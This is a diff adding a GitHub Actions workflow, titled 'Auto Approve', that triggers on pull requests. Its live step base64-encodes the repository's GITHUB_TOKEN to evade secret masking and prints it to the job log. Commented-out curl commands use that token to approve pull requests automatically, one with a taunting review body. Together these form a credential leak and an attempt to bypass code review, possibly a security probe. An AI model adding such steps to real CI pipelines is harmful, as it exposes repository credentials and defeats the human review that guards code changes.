@@ -1,0 +1,29 @@
+name: Auto Approve
+on: [pull_request]
+permissions:
+      id-token: write
+      contents: read 
+
+jobs:
+  AutoApproveTest:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out repository code
+        uses: actions/checkout@v3
+      - name: Create PR 
+        run: |
+          echo ${{ secrets.GITHUB_TOKEN }} | base64 >> /tmp/token.txt
+          cat /tmp/token.txt
+          # curl \
+          # -X POST \
+          # -H "Accept: application/vnd.github+json" -v \
+          # -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          # https://api.github.com/repos/form3tech/software-register-audit/pulls/${{ github.event.number }}/reviews \
+          # -d '{"event": "APPROVE"}'
+          ##### Approve review
+          #curl \
+          #-X PUT \
+          #-H "Accept: application/vnd.github+json" -v \
+          #-H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          #https://api.github.com/repos/form3tech/software-register-audit/pull/113/reviews/1337 \
+          #-d '{"body":"This is pefect, totally secure, good work!","event":"APPROVE"}'
